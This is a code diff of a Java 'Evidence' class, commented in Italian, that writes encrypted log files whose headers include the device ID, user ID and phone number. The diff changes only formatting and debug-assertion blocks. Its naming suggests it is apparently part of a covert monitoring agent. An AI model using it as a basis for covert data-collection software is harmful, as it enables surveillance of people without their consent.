@@ -124,17 +124,18 @@ public final class Evidence {
      */
     private Evidence(final int typeEvidenceId, final byte[] aesKey) {
         this();
-
+        //#ifdef DBC
         Check.requires(aesKey != null, "aesKey null"); //$NON-NLS-1$
+        //#endif
 
         // agent = agent_;
         this.typeEvidenceId = typeEvidenceId;
         this.aesKey = aesKey;
 
         encryption = new Encryption(aesKey);
-
+        //#ifdef DBC
         Check.ensures(encryption != null, "encryption null"); //$NON-NLS-1$
-
+        //#endif
     }
 
     /**
@@ -226,7 +227,6 @@ public final class Evidence {
         return "UNK";
     }
 
-    
     /**
      * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
      * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
@@ -265,7 +265,6 @@ public final class Evidence {
         return createEvidence(null);
     }
 
-
     /**
      * Questa funzione crea un file di log e lascia l'handle aperto. Il file
      * viene creato con un nome casuale, la chiamata scrive l'header nel file e
@@ -290,7 +289,7 @@ public final class Evidence {
         Check.requires(os == null && fconn == null,
                 "createLog: not previously closed");
         //#endif
-        
+
         timestamp = new Date();
 
         int additionalLen = 0;
@@ -356,7 +355,8 @@ public final class Evidence {
             debug.info("Created: " + fileName);
             //#endif
 
-            final byte[] plainBuffer = makeDescription(additionalData, typeEvidenceId);
+            final byte[] plainBuffer = makeDescription(additionalData,
+                    typeEvidenceId);
             //#ifdef DBC
             Check.asserts(plainBuffer.length >= 32 + additionalLen,
                     "Short plainBuffer");
@@ -552,19 +552,19 @@ public final class Evidence {
      * @return the byte[]
      */
     public byte[] makeDescription(final byte[] additionalData, final int logType) {
-    
+
         if (timestamp == null) {
             timestamp = new Date();
         }
-    
+
         int additionalLen = 0;
-    
+
         if (additionalData != null) {
             additionalLen = additionalData.length;
         }
-    
+
         final DateTime datetime = new DateTime(timestamp);
-    
+
         evidenceDescription = new EvidenceDescription();
         evidenceDescription.version = E_VERSION_01;
         evidenceDescription.logType = logType;
@@ -574,13 +574,13 @@ public final class Evidence {
         evidenceDescription.deviceIdLen = device.getWDeviceId().length;
         evidenceDescription.userIdLen = device.getWUserId().length;
         evidenceDescription.sourceIdLen = device.getWPhoneNumber().length;
-    
+
         final byte[] baseHeader = evidenceDescription.getBytes();
         //#ifdef DBC
         Check.asserts(baseHeader.length == evidenceDescription.length,
                 "Wrong log len");
         //#endif
-    
+
         final int headerLen = baseHeader.length
                 + evidenceDescription.additionalData
                 + evidenceDescription.deviceIdLen
@@ -588,18 +588,18 @@ public final class Evidence {
                 + evidenceDescription.sourceIdLen;
         final byte[] plainBuffer = new byte[Encryption
                 .getNextMultiple(headerLen)];
-    
+
         final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
                 plainBuffer.length, false);
         databuffer.write(baseHeader);
         databuffer.write(device.getWDeviceId());
         databuffer.write(device.getWUserId());
         databuffer.write(device.getWPhoneNumber());
-    
+
         if (additionalLen > 0) {
             databuffer.write(additionalData);
         }
-    
+
         return plainBuffer;
     }
 
